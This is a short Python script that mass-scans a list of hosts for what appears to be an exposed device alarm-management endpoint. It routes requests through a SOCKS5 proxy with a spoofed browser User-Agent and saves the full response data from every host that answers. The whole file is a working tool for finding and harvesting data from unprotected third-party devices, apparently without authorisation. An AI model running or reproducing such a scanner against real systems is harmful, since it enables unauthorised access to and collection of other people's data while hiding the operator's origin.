import requests
import concurrent.futures
from tqdm import tqdm

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Accept-Language": "en-US,en;q=0.5",
}

proxies = {
    "http": "socks5://127.0.0.1:1080",
    "https": "socks5://127.0.0.1:1080"
}

with open("ip.txt", "r") as f:
    urls = f.read().splitlines()

def request_url(url):
    url = f"http://{url}/robotservice/device/findAlarmStatByParam.action?page=1&limit=1&deviceName=&alarmType=&alarmStatus=&alarmLevel=&startTime=&stopTime=&offset=0"
    try:
        with requests.Session() as session:
            session.proxies.update(proxies)
            response = session.get(url, headers=headers, timeout=1)
            output = f"{url}: {response.status_code}\n"
            if response.status_code == 200:
                output += response.text
            output += "-----------------------------------------------\n"
            return output
    except requests.exceptions.RequestException as e:
        output = f"{url}: Error - {e}\n"
        output += "-----------------------------------------------\n"
        return output

with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(request_url, url) for url in urls]

    with open("output.txt", "w") as f:
        for future in tqdm(concurrent.futures.as_completed(futures), total=len(urls)):
            result = future.result()
            f.write(result)
